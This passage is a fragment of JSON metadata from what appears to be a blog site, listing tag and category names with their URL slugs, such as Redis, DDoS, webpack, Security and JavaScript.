"slug":"story","link":"/en/tags/story/"},{"name":"Hls","slug":"Hls","link":"/en/tags/Hls/"},{"name":"nand2tetris","slug":"nand2tetris","link":"/en/tags/nand2tetris/"},{"name":"Redis","slug":"Redis","link":"/en/tags/Redis/"},{"name":"Server","slug":"Server","link":"/en/tags/Server/"},{"name":"DDoS","slug":"DDoS","link":"/en/tags/DDoS/"},{"name":"webpack","slug":"webpack","link":"/en/tags/webpack/"}],"categories":[{"name":"React","slug":"React","link":"/en/categories/React/"},{"name":"Others","slug":"Others","link":"/en/categories/Others/"},{"name":"Front-end","slug":"Front-end","link":"/en/categories/Front-end/"},{"name":"Security","slug":"Security","link":"/en/categories/Security/"},{"name":"Web","slug":"Web","link":"/en/categories/Web/"},{"name":"Android","slug":"Android","link":"/en/categories/Android/"},{"name":"Back-end","slug":"Back-end","link":"/en/categories/Back-end/"},{"name":"Algorithm","slug":"Algorithm","link":"/en/categories/Algorithm/"},{"name":"JavaScript","slug":"JavaScript","link":"/en/categories/JavaScript/"}]}